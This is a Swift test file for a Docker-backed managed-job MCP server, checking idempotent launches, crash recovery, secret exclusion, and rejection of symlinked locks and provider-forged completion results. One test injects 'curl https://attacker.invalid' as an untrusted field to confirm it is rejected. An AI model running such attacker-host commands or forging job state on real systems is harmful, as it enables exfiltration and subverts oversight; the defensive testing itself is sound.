import Foundation
import Testing
import ASTRACore
@testable import WorkspaceToolSupport

private let foundationTaskID = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"
private let foundationRunID = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb"

@Suite("Workspace managed-job foundation", .serialized)
struct WorkspaceManagedJobFoundationTests {
    @Test("Provider cleanup preserves executor while trusted work is active")
    func providerCleanupPreservesExecutorForTrustedJob() {
        let executor = FoundationRecordingExecutor()
        let manager = FoundationRecordingJobManager()
        manager.hasOwnedJob = true
        let server = WorkspaceMCPServer(executor: executor, jobManager: manager)

        server.cleanup()
        #expect(!executor.cleanedUp)

        manager.hasOwnedJob = false
        server.cleanup()
        #expect(executor.cleanedUp)
    }

    @Test("Cleanup preserves a mismatched nonterminal receipt as uncertain ownership")
    func cleanupPreservesMismatchedNonterminalReceipt() throws {
        let root = temporaryDirectory("conflict")
        defer { try? FileManager.default.removeItem(at: root) }
        let jobRoot = root.appendingPathComponent("jobs", isDirectory: true)
        let store = WorkspaceManagedJobStore(rootPath: jobRoot.path)
        _ = try store.create(
            command: "sleep 60",
            timeoutSeconds: nil,
            label: nil,
            progressProbe: nil,
            runtime: "docker",
            taskID: "cccccccc-cccc-4ccc-8ccc-cccccccccccc",
            runID: "dddddddd-dddd-4ddd-8ddd-dddddddddddd",
            invocationID: "number:77",
            containerName: "corrupt-or-stale-container"
        )
        let configuration = WorkspaceToolConfiguration(
            dockerExecutable: "/usr/bin/false",
            image: "astra/workspace:latest",
            containerName: "astra-shared-container",
            workdir: "/workspace",
            network: "none",
            taskID: foundationTaskID,
            runID: foundationRunID,
            mounts: [],
            jobRootHostPath: jobRoot.path,
            jobRootContainerPath: "/workspace/jobs",
            managedJobTrustedStateHostPath: jobRoot.path
        )
        let manager = DockerWorkspaceJobManager(
            configuration: configuration,
            executor: DockerWorkspaceCommandExecutor(configuration: configuration)
        )

        #expect(manager.hasTrustedNonterminalOwnedJob())
    }

    @Test("Managed result is invocation-bound and excludes backend-private fields")
    func managedResultIsStrictAndSecretFree() throws {
        let executor = FoundationRecordingExecutor()
        let manager = FoundationRecordingJobManager()
        let server = WorkspaceMCPServer(executor: executor, jobManager: manager)
        let secret = "secret-token-that-must-not-escape"

        let response = try parseJSON(try #require(server.handleLine(
            #"{"jsonrpc":"2.0","id":"trusted-invocation","method":"tools/call","params":{"name":"workspace_job_start","arguments":{"command":"printf '#(secret)'"}}}"#
        )))
        let text = try resultText(response)
        let result = try #require(response["result"] as? [String: Any])
        let structuredContent = try #require(result["structuredContent"] as? [String: Any])
        let structuredData = try JSONSerialization.data(withJSONObject: structuredContent, options: [.sortedKeys])
        let textObject = try #require(JSONSerialization.jsonObject(with: Data(text.utf8)) as? NSDictionary)
        let structuredObject = try #require(JSONSerialization.jsonObject(with: structuredData) as? NSDictionary)
        let decoded = try structuredJobResult(response)

        #expect(textObject == structuredObject)
        #expect(decoded.startReceipt?.invocationID.hasSuffix("|string-base64:dHJ1c3RlZC1pbnZvY2F0aW9u") == true)
        #expect(decoded.startReceipt?.requestFingerprint.hasPrefix("sha256:") == true)
        #expect(!text.contains(secret))
        #expect(!text.contains("printf"))
        #expect(!text.contains("/tmp/job"))
        #expect(!text.contains("message"))

        var untrustedObject = try #require(
            JSONSerialization.jsonObject(with: Data(text.utf8)) as? [String: Any]
        )
        untrustedObject["command"] = "curl https://attacker.invalid"
        let untrustedData = try JSONSerialization.data(withJSONObject: untrustedObject)
        #expect(throws: (any Error).self) {
            _ = try JSONDecoder().decode(WorkspaceManagedJobStructuredResult.self, from: untrustedData)
        }
    }

    @Test("Workspace MCP restart reuses the client-durable invocation identity")
    func workspaceMCPRestartAdoptsOriginalInvocation() throws {
        let fixture = try makeDockerFixture("mcp-restart")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        defer { try? FileManager.default.removeItem(atPath: fixture.configuration.managedJobTrustedStateHostPath) }

        func makeServer() -> WorkspaceMCPServer {
            let executor = DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
            return WorkspaceMCPServer(
                executor: executor,
                jobManager: DockerWorkspaceJobManager(
                    configuration: fixture.configuration,
                    executor: executor
                ),
                invocationSessionID: fixture.configuration.runID
            )
        }
        let request = #"{"jsonrpc":"2.0","id":"durable-call-1","method":"tools/call","params":{"name":"workspace_job_start","arguments":{"command":"printf once"}}}"#
        let first = try structuredJobResult(parseJSON(try #require(makeServer().handleLine(request))))
        let retried = try structuredJobResult(parseJSON(try #require(makeServer().handleLine(request))))

        #expect(first.jobID == retried.jobID)
        #expect(first.startReceipt?.invocationID == retried.startReceipt?.invocationID)
        let logLines = try String(contentsOf: fixture.log, encoding: .utf8).split(separator: "\n")
        #expect(logLines.filter { $0.contains("exec -d") }.count == 1)
    }

    @Test("Concurrent identical invocation admits exactly one detached launch")
    func concurrentIdenticalInvocationLaunchesExactlyOnce() throws {
        let fixture = try makeDockerFixture("concurrent")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        let managers = (0..<2).map { _ -> DockerWorkspaceJobManager in
            let executor = DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
            return DockerWorkspaceJobManager(configuration: fixture.configuration, executor: executor)
        }
        let resultLock = NSLock()
        var results: [WorkspaceManagedJobRecord] = []
        DispatchQueue.concurrentPerform(iterations: 2) { index in
            let result = managers[index].start(
                command: "printf identical",
                timeoutSeconds: 7200,
                label: "concurrent",
                progressProbe: "log",
                invocationID: "string-base64:c3RhYmxlLWludm9jYXRpb24="
            )
            resultLock.lock()
            results.append(result)
            resultLock.unlock()
        }

        #expect(results.count == 2)
        #expect(Set(results.map(\.jobID)).count == 1)
        #expect(Set(results.compactMap { $0.startReceipt?.externalIdentity }).count == 1)
        #expect(results.contains { $0.status == .running })
        let logLines = try String(contentsOf: fixture.log, encoding: .utf8).split(separator: "\n")
        #expect(logLines.filter { $0.contains("exec -d") }.count == 1)
        #expect(logLines.filter { $0.contains("run --rm -d") }.count == 1)
    }

    @Test("Invocation id reuse with a different payload fails before relaunch")
    func invocationIDPayloadMismatchFailsClosed() throws {
        let fixture = try makeDockerFixture("mismatch")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        let executor = DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
        let manager = DockerWorkspaceJobManager(configuration: fixture.configuration, executor: executor)
        let invocationID = "number:42"

        let first = manager.start(
            command: "printf first",
            timeoutSeconds: 7200,
            label: "original",
            progressProbe: nil,
            invocationID: invocationID
        )
        let mismatch = manager.start(
            command: "printf different",
            timeoutSeconds: 7200,
            label: "original",
            progressProbe: nil,
            invocationID: invocationID
        )

        #expect(first.status == .running)
        #expect(mismatch.status == .failed)
        #expect(mismatch.message?.contains("reused with a different request") == true)
        let records = try WorkspaceManagedJobStore(
            rootPath: fixture.configuration.jobRootHostPath,
            trustedStateRootPath: fixture.configuration.managedJobTrustedStateHostPath
        ).listTrustedRecords()
        #expect(records.count == 1)
        #expect(records.first?.jobID == first.jobID)
        let logLines = try String(contentsOf: fixture.log, encoding: .utf8).split(separator: "\n")
        #expect(logLines.filter { $0.contains("exec -d") }.count == 1)
    }

    @Test("Non-finite timeout is rejected before durable admission or Docker")
    func nonFiniteTimeoutFailsBeforeAdmission() throws {
        let fixture = try makeDockerFixture("nonfinite")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        let executor = DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
        let manager = DockerWorkspaceJobManager(configuration: fixture.configuration, executor: executor)

        let result = manager.start(
            command: "printf never",
            timeoutSeconds: .infinity,
            label: nil,
            progressProbe: nil,
            invocationID: "number:99"
        )

        #expect(result.status == .failed)
        #expect(result.message?.contains("Invalid workspace managed-job request payload") == true)
        #expect(!FileManager.default.fileExists(atPath: fixture.log.path))
        let records = try WorkspaceManagedJobStore(
            rootPath: fixture.configuration.jobRootHostPath,
            trustedStateRootPath: fixture.configuration.managedJobTrustedStateHostPath
        ).listTrustedRecords()
        #expect(records.isEmpty)
    }

    @Test("Admission rejects a symlink-substituted kernel lock")
    func admissionRejectsSymlinkedLock() throws {
        let root = temporaryDirectory("lock-symlink")
        defer { try? FileManager.default.removeItem(at: root) }
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let outside = root.appendingPathComponent("outside")
        try "do-not-touch".write(to: outside, atomically: true, encoding: .utf8)
        let jobRoot = root.appendingPathComponent("jobs", isDirectory: true)
        try FileManager.default.createDirectory(at: jobRoot, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(
            at: jobRoot.appendingPathComponent(".invocation-admission.lock"),
            withDestinationURL: outside
        )
        let store = WorkspaceManagedJobStore(rootPath: jobRoot.path)

        #expect(throws: (any Error).self) {
            _ = try store.admitInvocation(
                command: "true",
                timeoutSeconds: nil,
                label: nil,
                progressProbe: nil,
                runtime: "docker",
                taskID: foundationTaskID,
                runID: foundationRunID,
                invocationID: "number:9",
                containerName: "astra-lock-test"
            )
        }
        #expect(try String(contentsOf: outside, encoding: .utf8) == "do-not-touch")
        #expect(throws: (any Error).self) {
            _ = try store.listTrustedRecords()
        }
    }

    @Test("Provider-visible receipt deletion cannot repeat an admitted invocation")
    func providerVisibleReceiptDeletionCannotRepeatInvocation() throws {
        let fixture = try makeDockerFixture("provider-receipt-delete")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        defer { try? FileManager.default.removeItem(atPath: fixture.configuration.managedJobTrustedStateHostPath) }
        let manager = DockerWorkspaceJobManager(
            configuration: fixture.configuration,
            executor: DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
        )
        let invocationID = "string-base64:cHJvdmlkZXItY2Fubm90LWVyYXNl"

        let first = manager.start(
            command: "printf once",
            timeoutSeconds: 7200,
            label: nil,
            progressProbe: nil,
            invocationID: invocationID
        )
        try FileManager.default.removeItem(
            at: URL(fileURLWithPath: fixture.configuration.jobRootHostPath)
                .appendingPathComponent(first.jobID, isDirectory: true)
                .appendingPathComponent("job.json", isDirectory: false)
        )

        let retry = manager.start(
            command: "printf once",
            timeoutSeconds: 7200,
            label: nil,
            progressProbe: nil,
            invocationID: invocationID
        )

        #expect(retry.jobID == first.jobID)
        let logLines = try String(contentsOf: fixture.log, encoding: .utf8).split(separator: "\n")
        #expect(logLines.filter { $0.contains("exec -d") }.count == 1)
    }

    @Test("Provider-writable trusted state fails closed before admission or cleanup")
    func providerWritableTrustedStateFailsClosed() throws {
        let fixture = try makeDockerFixture("provider-writable-trusted-state")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        defer { try? FileManager.default.removeItem(atPath: fixture.configuration.managedJobTrustedStateHostPath) }
        var unsafeConfiguration = fixture.configuration
        unsafeConfiguration.managedJobTrustedStateHostPath = unsafeConfiguration.jobRootHostPath
        let manager = DockerWorkspaceJobManager(
            configuration: unsafeConfiguration,
            executor: DockerWorkspaceCommandExecutor(configuration: unsafeConfiguration)
        )

        let result = manager.start(
            command: "printf never",
            timeoutSeconds: nil,
            label: nil,
            progressProbe: nil,
            invocationID: "number:706"
        )
        var cleaned = false

        #expect(result.status == .failed)
        #expect(result.message?.contains("outside every provider-writable Docker mount") == true)
        #expect(!manager.cleanupExecutorIfIdle { cleaned = true })
        #expect(!cleaned)
        #expect(!FileManager.default.fileExists(atPath: fixture.log.path))
    }

    @Test("Crash-left queued receipt is adopted without creating a second job")
    func queuedReceiptIsAdoptedOnRetry() throws {
        let fixture = try makeDockerFixture("queued-adoption")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        defer { try? FileManager.default.removeItem(atPath: fixture.configuration.managedJobTrustedStateHostPath) }
        let store = WorkspaceManagedJobStore(
            rootPath: fixture.configuration.jobRootHostPath,
            trustedStateRootPath: fixture.configuration.managedJobTrustedStateHostPath
        )
        let invocationID = "number:707"
        let queued = try store.admitInvocation(
            command: "printf adopted",
            timeoutSeconds: 7200,
            label: "adopt",
            progressProbe: nil,
            runtime: "docker",
            taskID: foundationTaskID,
            runID: foundationRunID,
            invocationID: invocationID,
            containerName: fixture.configuration.containerName
        ).record
        let manager = DockerWorkspaceJobManager(
            configuration: fixture.configuration,
            executor: DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
        )

        let adopted = manager.start(
            command: "printf adopted",
            timeoutSeconds: 7200,
            label: "adopt",
            progressProbe: nil,
            invocationID: invocationID
        )

        #expect(adopted.jobID == queued.jobID)
        #expect(adopted.status == .running)
        #expect(try store.listTrustedRecords().count == 1)
        let logLines = try String(contentsOf: fixture.log, encoding: .utf8).split(separator: "\n")
        #expect(logLines.filter { $0.contains("exec -d") }.count == 1)
    }

    @Test("An ambiguous detached launch is fenced and never repeated")
    func ambiguousDetachedLaunchIsNotRepeated() throws {
        let fixture = try makeDockerFixture("ambiguous-launch")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        defer { try? FileManager.default.removeItem(atPath: fixture.configuration.managedJobTrustedStateHostPath) }
        let store = WorkspaceManagedJobStore(
            rootPath: fixture.configuration.jobRootHostPath,
            trustedStateRootPath: fixture.configuration.managedJobTrustedStateHostPath
        )
        let queued = try store.admitInvocation(
            command: "printf once",
            timeoutSeconds: 7200,
            label: nil,
            progressProbe: nil,
            runtime: "docker",
            taskID: foundationTaskID,
            runID: foundationRunID,
            invocationID: "number:708",
            containerName: fixture.configuration.containerName
        ).record
        var launchCount = 0
        store.afterLaunchBeforeSaveForTesting = {
            throw CocoaError(.fileWriteUnknown)
        }

        #expect(throws: (any Error).self) {
            _ = try store.launchQueuedInvocation(jobID: queued.jobID) { fenced in
                launchCount += 1
                #expect(fenced.status == .launching)
                var launched = fenced
                launched.status = .running
                return launched
            }
        }
        #expect(try store.load(jobID: queued.jobID).status == .launching)

        store.afterLaunchBeforeSaveForTesting = nil
        let retry = try store.launchQueuedInvocation(jobID: queued.jobID) { record in
            launchCount += 1
            return record
        }
        #expect(retry.status == .launching)
        #expect(launchCount == 1)
    }

    @Test("Provider metadata projection failure does not override trusted admission")
    func providerProjectionFailurePreservesTrustedRecord() throws {
        let fixture = try makeDockerFixture("projection-failure")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        defer { try? FileManager.default.removeItem(atPath: fixture.configuration.managedJobTrustedStateHostPath) }
        let store = WorkspaceManagedJobStore(
            rootPath: fixture.configuration.jobRootHostPath,
            trustedStateRootPath: fixture.configuration.managedJobTrustedStateHostPath
        )
        store.beforeProviderProjectionWriteForTesting = { _ in
            throw CocoaError(.fileWriteUnknown)
        }

        let admitted = try store.admitInvocation(
            command: "printf durable",
            timeoutSeconds: nil,
            label: nil,
            progressProbe: nil,
            runtime: "docker",
            taskID: foundationTaskID,
            runID: foundationRunID,
            invocationID: "number:709",
            containerName: fixture.configuration.containerName
        ).record

        #expect(admitted.status == .queued)
        #expect(try store.listTrustedRecords().map(\.jobID) == [admitted.jobID])
        let providerMetadata = try store.jobDirectory(jobID: admitted.jobID)
            .appendingPathComponent("job.json")
        #expect(!FileManager.default.fileExists(atPath: providerMetadata.path))
    }

    @Test("Durable trusted receipt is synchronized before detached launch")
    func trustedReceiptPrecedesDetachedLaunch() throws {
        let fixture = try makeDockerFixture("receipt-before-launch")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        defer { try? FileManager.default.removeItem(atPath: fixture.configuration.managedJobTrustedStateHostPath) }
        let manager = DockerWorkspaceJobManager(
            configuration: fixture.configuration,
            executor: DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
        )

        let result = manager.start(
            command: "printf durable",
            timeoutSeconds: nil,
            label: nil,
            progressProbe: nil,
            invocationID: "number:708"
        )

        #expect(result.status == .running)
        let trustedRecords = try FileManager.default.contentsOfDirectory(
            at: URL(fileURLWithPath: fixture.configuration.managedJobTrustedStateHostPath),
            includingPropertiesForKeys: nil
        ).filter { $0.pathExtension == "json" }
        #expect(trustedRecords.count == 1)
    }

    @Test("Provider-forged terminal result cannot authorize executor cleanup")
    func providerForgedTerminalResultCannotAuthorizeCleanup() throws {
        let fixture = try makeDockerFixture("provider-result-forgery")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        defer { try? FileManager.default.removeItem(atPath: fixture.configuration.managedJobTrustedStateHostPath) }
        let manager = DockerWorkspaceJobManager(
            configuration: fixture.configuration,
            executor: DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
        )
        let job = manager.start(
            command: "sleep 60",
            timeoutSeconds: 7200,
            label: nil,
            progressProbe: nil,
            invocationID: "number:818"
        )
        try #"{"status":"succeeded","exitCode":0,"completedAt":"2026-07-21T22:00:00Z"}"#
            .write(to: URL(fileURLWithPath: job.resultPath), atomically: true, encoding: .utf8)
        var cleaned = false

        let didClean = manager.cleanupExecutorIfIdle { cleaned = true }

        #expect(!didClean)
        #expect(!cleaned)
        #expect(manager.status(jobID: job.jobID).status == .succeeded)
        #expect(manager.hasTrustedNonterminalOwnedJob())
    }

    @Test("Host-verified natural completion is persisted before cleanup")
    func naturalCompletionIsTrustedBeforeCleanup() throws {
        let fixture = try makeDockerFixture("natural-completion")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        defer { try? FileManager.default.removeItem(atPath: fixture.configuration.managedJobTrustedStateHostPath) }
        let manager = DockerWorkspaceJobManager(
            configuration: fixture.configuration,
            executor: DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
        )
        let job = manager.start(
            command: "printf complete",
            timeoutSeconds: 7200,
            label: nil,
            progressProbe: nil,
            invocationID: "number:819"
        )
        try #"{"status":"succeeded","exitCode":0,"completedAt":"2026-07-21T22:00:00Z"}"#
            .write(to: URL(fileURLWithPath: job.resultPath), atomically: true, encoding: .utf8)
        FileManager.default.createFile(
            atPath: fixture.root.appendingPathComponent("host-verified-terminal").path,
            contents: Data()
        )
        var cleaned = false

        #expect(manager.cleanupExecutorIfIdle { cleaned = true })
        #expect(cleaned)
        let trusted = try WorkspaceManagedJobStore(
            rootPath: fixture.configuration.jobRootHostPath,
            trustedStateRootPath: fixture.configuration.managedJobTrustedStateHostPath
        ).listTrustedRecords()
        #expect(trusted.count == 1)
        #expect(trusted.first?.status == .succeeded)
        #expect(trusted.first?.exitCode == 0)
    }

    @Test("Host verification skips the verifier's own process entry")
    func hostVerificationExcludesVerifierProcess() throws {
        let root = temporaryDirectory("verifier-scan")
        defer { try? FileManager.default.removeItem(at: root) }
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let fakeProc = root.appendingPathComponent("proc", isDirectory: true)
        let commandScript = "/workspace/jobs/job-verify/command.sh"
        // The only test-time edit to the real script is re-rooting /proc
        // into the fixture so it can execute outside a Linux container.
        let verifier = DockerWorkspaceJobManager
            .hostVerificationScript(commandScript: commandScript)
            .replacingOccurrences(of: "/proc/", with: fakeProc.path + "/")
        let verifierURL = root.appendingPathComponent("verifier.sh")
        try verifier.write(to: verifierURL, atomically: true, encoding: .utf8)
        // Reproduce the container's process table as the verifier sees it:
        // the shell executing the verifier publishes the whole `sh -c`
        // script - including the command_script assignment - as its own
        // cmdline entry.
        let harnessURL = root.appendingPathComponent("harness.sh")
        try """
        #!/bin/sh
        mkdir -p '\(fakeProc.path)'/$$
        printf 'sh -c command_script=%s scan' '\(commandScript)' > '\(fakeProc.path)'/$$/cmdline
        . '\(verifierURL.path)'
        """.write(to: harnessURL, atomically: true, encoding: .utf8)

        func verifierExitCode(guardianAlive: Bool) throws -> Int32 {
            try? FileManager.default.removeItem(at: fakeProc)
            try FileManager.default.createDirectory(at: fakeProc, withIntermediateDirectories: true)
            if guardianAlive {
                let guardian = fakeProc.appendingPathComponent("424242", isDirectory: true)
                try FileManager.default.createDirectory(at: guardian, withIntermediateDirectories: true)
                try "sh \(commandScript) run".write(
                    to: guardian.appendingPathComponent("cmdline"),
                    atomically: true,
                    encoding: .utf8
                )
            }
            let process = Process()
            process.executableURL = URL(fileURLWithPath: "/bin/sh")
            process.arguments = [harnessURL.path]
            try process.run()
            process.waitUntilExit()
            return process.terminationStatus
        }

        // Only the verifier's own entry mentions the command script: the
        // guardian has exited and host verification must succeed.
        #expect(try verifierExitCode(guardianAlive: false) == 0)
        // A live guardian is still detected.
        #expect(try verifierExitCode(guardianAlive: true) == 73)
    }

    @Test("Cleanup exclusion remains held through stop while admission waits")
    func cleanupExclusionCoversStopAndAdmission() throws {
        let root = temporaryDirectory("cleanup-admission-race")
        let jobRoot = root.appendingPathComponent("jobs", isDirectory: true)
        let trustedRoot = root.appendingPathComponent("trusted", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let cleanupStore = WorkspaceManagedJobStore(
            rootPath: jobRoot.path,
            trustedStateRootPath: trustedRoot.path
        )
        let admissionStore = WorkspaceManagedJobStore(
            rootPath: jobRoot.path,
            trustedStateRootPath: trustedRoot.path
        )
        let cleanupEntered = DispatchSemaphore(value: 0)
        let releaseCleanup = DispatchSemaphore(value: 0)
        let admissionAttempted = DispatchSemaphore(value: 0)
        let admissionFinished = DispatchSemaphore(value: 0)
        let queue = DispatchQueue(label: "managed-job-cleanup-race", attributes: .concurrent)

        queue.async {
            _ = try? cleanupStore.withExclusiveAdmissionAndCleanup {
                cleanupEntered.signal()
                releaseCleanup.wait()
            }
        }
        #expect(cleanupEntered.wait(timeout: .now() + 2) == .success)
        queue.async {
            admissionAttempted.signal()
            _ = try? admissionStore.admitInvocation(
                command: "printf after-cleanup",
                timeoutSeconds: nil,
                label: nil,
                progressProbe: nil,
                runtime: "docker",
                taskID: foundationTaskID,
                runID: foundationRunID,
                invocationID: "number:991",
                containerName: "astra-cleanup-race"
            )
            admissionFinished.signal()
        }

        #expect(admissionAttempted.wait(timeout: .now() + 2) == .success)
        #expect(admissionFinished.wait(timeout: .now() + 0.15) == .timedOut)
        releaseCleanup.signal()
        #expect(admissionFinished.wait(timeout: .now() + 2) == .success)
        #expect(try admissionStore.listTrustedRecords().count == 1)
    }

    private func temporaryDirectory(_ suffix: String) -> URL {
        FileManager.default.temporaryDirectory
            .appendingPathComponent("astra-managed-foundation-\(suffix)-\(UUID().uuidString)", isDirectory: true)
    }

    private func makeDockerFixture(_ suffix: String) throws -> DockerFixture {
        let root = temporaryDirectory(suffix)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let jobRoot = root.appendingPathComponent("jobs", isDirectory: true)
        let trustedRoot = root.deletingLastPathComponent()
            .appendingPathComponent(root.lastPathComponent + "-trusted", isDirectory: true)
        let docker = root.appendingPathComponent("docker")
        let log = root.appendingPathComponent("docker.log")
        let quotedLogPath = log.path.replacingOccurrences(of: "'", with: "'\\''")
        let quotedJobRoot = jobRoot.path.replacingOccurrences(of: "'", with: "'\\''")
        let quotedTrustedRoot = trustedRoot.path.replacingOccurrences(of: "'", with: "'\\''")
        let quotedTerminalMarker = root.appendingPathComponent("host-verified-terminal").path
            .replacingOccurrences(of: "'", with: "'\\''")
        try """
        #!/bin/sh
        printf '%s\\n' "$*" >> '\(quotedLogPath)'
        case "$1" in
          inspect) exit 1 ;;
          rm) exit 0 ;;
          run) echo container-id; exit 0 ;;
          exec)
            if [ "$2" = "-d" ]; then
              record="$(find '\(quotedJobRoot)' -name job.json -type f | head -1)"
              trusted_record="$(find '\(quotedTrustedRoot)' -name '*.json' -type f | head -1)"
              grep -q '"status" : "launching"' "$record" || exit 41
              grep -q '"startReceipt"' "$record" || exit 42
              grep -q '"startReceipt"' "$trusted_record" || exit 43
              exit 0
            fi
            [ -f '\(quotedTerminalMarker)' ] && exit 0
            exit 73
            ;;
          stop) exit 0 ;;
          *) exit 99 ;;
        esac
        """.write(to: docker, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: docker.path)
        return DockerFixture(
            root: root,
            log: log,
            configuration: WorkspaceToolConfiguration(
                dockerExecutable: docker.path,
                image: "astra/workspace:latest",
                containerName: "astra-test-\(suffix)",
                workdir: "/workspace",
                network: "bridge",
                taskID: foundationTaskID,
                runID: foundationRunID,
                mounts: [
                    WorkspaceDockerMount(hostPath: root.path, containerPath: "/workspace", access: "rw", role: "workspace")
                ],
                jobRootHostPath: jobRoot.path,
                jobRootContainerPath: "/workspace/jobs",
                managedJobTrustedStateHostPath: trustedRoot.path
            )
        )
    }

    private func parseJSON(_ line: String) throws -> [String: Any] {
        try #require(JSONSerialization.jsonObject(with: Data(line.utf8)) as? [String: Any])
    }

    private func resultText(_ object: [String: Any]) throws -> String {
        let result = try #require(object["result"] as? [String: Any])
        let content = try #require(result["content"] as? [[String: Any]])
        return try #require(content.first?["text"] as? String)
    }

    private func structuredJobResult(_ object: [String: Any]) throws -> WorkspaceManagedJobStructuredResult {
        try JSONDecoder().decode(
            WorkspaceManagedJobStructuredResult.self,
            from: Data(try resultText(object).utf8)
        )
    }
}

private struct DockerFixture {
    var root: URL
    var log: URL
    var configuration: WorkspaceToolConfiguration
}

private final class FoundationRecordingExecutor: WorkspaceCommandExecutor {
    private(set) var cleanedUp = false

    func run(command: String, timeoutSeconds _: TimeInterval) -> WorkspaceCommandResult {
        WorkspaceCommandResult(command: command, exitCode: 0, stdout: "", stderr: "")
    }

    func cleanup() { cleanedUp = true }
}

private final class FoundationRecordingJobManager: WorkspaceJobManaging {
    var hasOwnedJob = false

    func start(
        command: String,
        timeoutSeconds: TimeInterval?,
        label: String?,
        progressProbe: String?,
        invocationID: String
    ) -> WorkspaceManagedJobRecord {
        let now = Date(timeIntervalSince1970: 1_782_300_000)
        let receipt = try! WorkspaceManagedJobStartReceipt.make(
            taskID: foundationTaskID,
            runID: foundationRunID,
            invocationID: invocationID,
            requestFingerprint: try! WorkspaceManagedJobRequestFingerprint.make(
                command: command,
                timeoutSeconds: timeoutSeconds,
                label: label,
                progressProbe: progressProbe
            ),
            containerName: "astra-test-job",
            jobID: "job-1"
        )
        return WorkspaceManagedJobRecord(
            jobID: "job-1",
            command: command,
            label: label,
            progressProbe: progressProbe,
            runtime: "docker",
            status: .running,
            createdAt: now,
            startedAt: now,
            updatedAt: now,
            stdoutLogPath: "/tmp/job/stdout.log",
            stderrLogPath: "/tmp/job/stderr.log",
            heartbeatPath: "/tmp/job/heartbeat.json",
            resultPath: "/tmp/job/result.json",
            startReceipt: receipt
        )
    }

    func status(jobID: String) -> WorkspaceManagedJobRecord {
        start(command: "status", timeoutSeconds: nil, label: nil, progressProbe: nil, invocationID: "number:2")
    }

    func tail(jobID: String, stream: String, lines _: Int) -> WorkspaceManagedJobTail {
        WorkspaceManagedJobTail(jobID: jobID, stream: stream, text: "")
    }

    func cancel(jobID: String) -> WorkspaceManagedJobRecord {
        start(command: "cancel", timeoutSeconds: nil, label: nil, progressProbe: nil, invocationID: "number:3")
    }

    func wait(jobID: String, timeoutSeconds: TimeInterval) -> WorkspaceManagedJobRecord {
        start(command: "wait", timeoutSeconds: timeoutSeconds, label: nil, progressProbe: nil, invocationID: "number:4")
    }

    func hasTrustedNonterminalOwnedJob() -> Bool { hasOwnedJob }
}
